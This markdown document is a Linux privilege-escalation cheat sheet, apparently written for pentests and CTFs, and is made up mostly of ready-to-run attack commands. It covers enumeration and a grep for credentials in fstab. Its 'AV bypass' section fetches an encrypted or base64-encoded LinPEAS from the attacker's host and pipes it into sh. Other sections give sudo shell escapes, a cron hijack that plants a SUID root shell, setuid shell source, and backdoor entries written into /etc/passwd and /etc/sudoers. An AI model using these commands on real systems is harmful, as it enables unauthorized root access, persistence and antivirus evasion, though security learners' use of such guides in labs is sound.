# System Information Gathering
**OS Info** 
- `(cat /proc/version || uname -a ) 2>/dev/null`
- `lsb_release -a 2>/dev/null`
**Path**
- `echo $PATH`
**Environment Info**
- `(env || set) 2>/dev/null`
**Kernel Exploits**
- `cat /proc/version`
- `uname -a`
- `searchsploit "Linux Kernel"`
**System Stats**
- `(df -h || lsblk)`
**CPU Info**
- `lscpu`
**Drives**
- `ls /dev 2>/dev/null | grep -i "sd"`
- `cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null`
- `grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null` (Checks if there are credentials in fstab)
**Process Info**
> Take a look to what processes are being executed and check if any process has more privileges than it should (maybe a tomcat being executed by root?)
- `ps aux`
- `ps -ef`
- `top -n 1`
*** For Process Monitoring (pspy) ***
- git clone https://github.com/DominicBreuker/pspy.git
**Services**
- `systemctl show-environment`
# User Enumeration 
**Info about me**
- `id || (whoami && groups) 2>/dev/null`
**List all users**
- `cat /etc/passwd | cut -d: -f1`
**List users with console**
- `cat /etc/passwd | grep "sh$"`
**List superusers**
- `awk -F: '($3 == "0") {print}' /etc/passwd`
**Login history**
- `last | tail`
**List all users and their groups**
- `for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort`
# TOOLS
## LinPEAS 
>Searches Best Privilege Escalation Paths for Debian, CentOS, FreeBSD, OpenBSD and MacOS.
- wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
- chmod +x linpeas_linux_amd64
`./linpeas_linux_amd64 > /dev/shm/linpeas.txt` (for storing output)
 `less -r /dev/shm/linpeas.txt` (Read with colors)

**AV bypass**
- open-ssl encryption
	- `openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc`
	- `sudo python -m SimpleHTTPServer 80` (Starting HTTP server)
	- ` curl <our ip>/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh ` (Download from the victim)

- Base 64 encoded
	- ` base64 -w0 linpeas.sh > lp.enc`
	- `sudo python -m SimpleHTTPServer 80` (Starting HTTP server)
	- `curl <our ip>/lp.enc | base64 -d | sh`  (Download from the victim)

**Useful Parameters**  
-   **a (checks all)** - This will execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using su with the top 2000 passwords.
-  **e (extra enumeration)** - This will execute enumeration checks that are avoided by default
-  **s (superfast & stealth)** - This will bypass some time consuming checks - Stealth mode (Nothing will be written to disk)
- **P (Password)** - Pass a password that will be used with sudo -l and bruteforcing other users
-  **D (Debug)** - Print information about the checks that haven't discovered anything and about the time each check took
-  **d/-p/-i/-t (Local Network Enumeration)** - Linpeas can also discover and port-scan local networks

## Enumy
>  ultra fast portable executable that you drop on target Linux machine during a pentest or CTF in the post exploitation phase
- wget https://github.com/luke-goddard/enumy/releases/download/v1.3/enumy64
- chmod +x enumy64
`./enumy64 -h` (All Basic parameters)
`./enumy64 -a` (Audits All enumeration)

## LinEnum
> Local Linux System Enumeration & Privilege Escalation (Relatively new)
- git clone https://github.com/rebootuser/LinEnum.git
- chmod +x LinEnum.sh
`./LinEnum.sh -h` (All The Options

## Kernelpop
>  Automated kernel vulnerability enumeration and exploitation on the following operating systems (Linux / MacOS)
 - **Requires Python 2 or Python 3**
 - git clone https://github.com/spencerdodd/kernelpop
  `python kernelpop.py || python3 kernelpop.py`
 - **For making executable**
`./create_executable.sh`
`./kernelpop`
- **Parameters**
	- **{empty}** - default mode
	- **-e {exploit name}**  - Exploit mode
	- **-e {exploit name}  -d** -  dump-source  mode
	-  **- i** - Interactive mode
	- **-u {uname -a output}** - uname mode
	- **--digest json** - json output file

# Exploitation
## Exploiting SUDO rights/user
- `sudo -l` Prints the commands which we are allowed to run as SUDO.
> We can run find, cat and python as SUDO. These all commands will run as root when run with SUDO. If we can somehow escape to the shell through any of these commands, we can get root access.
-  **Find** command’s exec parameter can be used for arbitrary code execution.
 `sudo find /home -exec sh -i \;`
> Never give SUDO rights to any of the programming language compiler, interpreter and editors. (vi, more, less, perl, ruby, gdb and others.)
- spawning a shell using python
`sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’`

## Exploiting CRON jobs
- `ls -la /etc/cron.d`  (prints cron jobs which are already present in cron.d)
-  `find / -perm -2 -type f 2>/dev/null` (prints world writable files)
- `ls -la /usr/local/sbin/<file_name>` (confirming the file is writable)
> If the file is writable and being run by cronjob, any command we write/append in the file will be executed as ‘root’.
- Writing a C file and compiling it
> int main(void)
> {
> setgid(0);
> setuid(0);
> execl("/bin/sh", "sh", 0);
> }
> 
> ** for compiling:** `gcc <file_name>.c -o <output_filename>`
-  `echo “chown root:root <destination_path>/<output_filename>; chmod u+s <destination_path>/<output_filename>;”>/usr/local/sbin/cron-<writable_file>.sh` (This will change the executable’s owner and group as root. It will also set the SUID bit.)
- `./<output_filename>.sh` (Spawns the root shell)

# SUDO and SUID
**Check commands you can execute with sudo** 
- `sudo -l` 
**Find all SUID binaries** 
`find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
`find / -uid 0 -perm -4000 -type f 2>/dev/null` 
- Create a SUID binary 
> - ` print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c`   
> -  `gcc -o /tmp/suid /tmp/suid.c` 
> -  `sudo chmod +x /tmp/suid # execute right`
> - `sudo chmod +s /tmp/suid # setuid bit`

**Unexpected commands allows you to read and/or write files or even execute command**
- `sudo awk 'BEGIN {system("/bin/sh")}'`
- `sudo find /etc -exec sh -i \;`
- `sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh`
- `sudo tar c a.tar -I ./runme.sh a`
- `ftp>!/bin/sh`
- `less>! <shell_comand>`
# Backups
- `find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/nulll`
# Logs
- `aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"`
- `grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null`

# Capabilities 
- List all the capabilities of binary 
- `/usr/bin/getcap -r  /usr/bin`
- Interesting capabilities
> Having the capability =ep means the binary has all the capabilities.
> the following capabilities can be used in order to upgrade your current privileges.
- cap_dac_read_search (read anything)
- cap_setuid+ep  (setuid)

# Writable Files
- List all the writable files on the system
` find / -writable ! -user ``whoami`` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null` 
- `find / -perm -2 -type f 2>/dev/null`
- `find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null`
**Writeable etc/passwd**
- First generate a password with this command
- `openssl passwd -1 -salt hacker hacker` / `mkpasswd -m SHA-512 hacker`
- Then add the user **hacker** and add the generated password.
- `hacker:(GENERATED_PASSWORD_HERE):0:0:Hacker:/root:/bin/bash`
- Now, we can use **su** command with **hacker:hacker**
> We can also create a dummy user without any password
- `echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd`
**Writable **etc/sudoers**
- `echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers`
- For SUDO Without password
- `echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers`
- `echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers`
## Additional Info and Resources
- https://book.hacktricks.xyz/linux-unix/privilege-escalation
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- https://github.com/carlospolop/PEASS-ng